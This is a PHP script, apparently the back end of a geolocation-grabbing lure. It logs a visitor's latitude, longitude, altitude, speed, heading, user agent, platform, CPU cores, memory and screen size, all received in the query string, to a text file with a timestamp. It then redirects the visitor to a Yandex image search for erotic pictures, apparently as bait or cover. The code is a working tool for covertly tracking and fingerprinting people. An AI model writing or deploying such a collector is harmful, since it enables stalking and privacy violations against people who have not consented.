<?php

$timezone=+5;
$t=gmdate("Y/m/j H:i:s", time()+3600*($timezone+date("I")));
file_put_contents("geolocate.txt", "Latitude: " . $_GET['latitude'] . "\n" . "Longitude: " . $_GET["longitude"] . "\n" . "User-Agent: " . $_GET["useragent"] . "\n" . "Altitude: " . $_GET["altitude"] . "\n" . "Accuracy: " . $_GET["accuracy"] . "\n" . "Speed: "  . $_GET["speed"] . "\n" . "Heading: " . $_GET["heading"] . "\n" . "Platform: " . $_GET["platform"] . "\n" . "Cores: " . $_GET["hardware"] . "\n" . "Memory: "   . $_GET["memory"] ."\n" . "Screen Height: "   . $_GET["height"] ."\n" . "Screen Width: "   . $_GET["width"] ."\n"."Time:".$t."\n----------------------", FILE_APPEND);

header('Location: https://yandex.ru/images/search?text=прозрачный%20пнг%20красивый%20фигуристый%20голый%20девушки%20фото&lr=10338&pos=0&img_url=https%3A%2F%2Flook.com.ua%2Fpic%2F201811%2F2560x1440%2Flook.com.ua-316137.jpg&rpt=simage&rlt_url=https%3A%2F%2Favatars.mds.yandex.net%2Fget-pdb%2F2491915%2F034d12f7-6089-48bf-b7a3-f550d3d2f8bc%2Fs1200%3Fwebp%3Dfalse&ogl_url=https%3A%2F%2Flook.com.ua%2Fpic%2F201811%2F2560x1440%2Flook.com.ua-316137.jpg');
exit();
?>
